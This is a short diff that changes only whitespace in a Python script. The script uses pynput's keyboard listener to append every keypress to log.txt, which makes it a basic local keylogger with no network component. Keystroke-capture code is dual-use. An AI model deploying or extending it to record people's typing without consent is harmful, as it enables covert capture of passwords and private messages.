@@ -1,5 +1,4 @@
-from pynput.keyboard import Listener
-
+from pynput.keyboard import Listener
 def write_to_file(key):
     letter = str(key)
     letter = letter.replace("'", "")
@@ -13,7 +12,6 @@ def write_to_file(key):
         letter = "\n"
     with open("log.txt", 'a') as f:
         f.write(letter)
-
 
 # Collecting events until stopped
 with Listener(on_press=write_to_file) as l:
